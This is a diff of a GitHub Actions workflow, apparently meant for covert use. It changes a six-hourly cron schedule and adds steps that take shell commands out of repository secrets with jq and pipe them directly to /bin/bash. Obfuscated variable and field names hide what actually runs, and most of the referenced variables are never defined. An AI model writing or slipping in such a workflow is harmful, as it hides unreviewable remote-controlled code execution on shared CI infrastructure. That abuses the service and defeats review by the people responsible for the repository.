@@ -3,23 +3,25 @@ name: tulongzhe2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
+    - cron: '11 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tulongzhe2345
         env:
-          x9: ${{ secrets.x9 }}
+          flgk42: ${{ secrets.flgk42 }}
         run: |
-          echo $x9 | jq -r .scc12626 | /bin/bash
-          echo $p0577 | jq -r .look107 | /bin/bash
-          echo $qruw8 | jq -r .lt7 | /bin/bash
-          echo $obz929 | jq -r .y2926 | /bin/bash
-          echo $biaw84 | jq -r .e03152 | /bin/bash
-          echo $hti464 | jq -r .qkdv5300 | /bin/bash
-          echo $aw978 | jq -r .zdl076 | /bin/bash
+          echo $flgk42 | jq -r .zt735 | /bin/bash
+          echo $ei5994 | jq -r .ycnnb95013 | /bin/bash
+          echo $vyo464 | jq -r .qmxf7 | /bin/bash
+          echo $nkrt9680 | jq -r .froot40 | /bin/bash
+          echo $sko69 | jq -r .w828 | /bin/bash
+          echo $yn01 | jq -r .cyh906 | /bin/bash
+          echo $eoqf1161 | jq -r .kwa4642 | /bin/bash
+          echo $hb7 | jq -r .dwn0 | /bin/bash
+          echo $i5 | jq -r .ty300 | /bin/bash
+          echo $vxzr6 | jq -r .bmg46 | /bin/bash
 
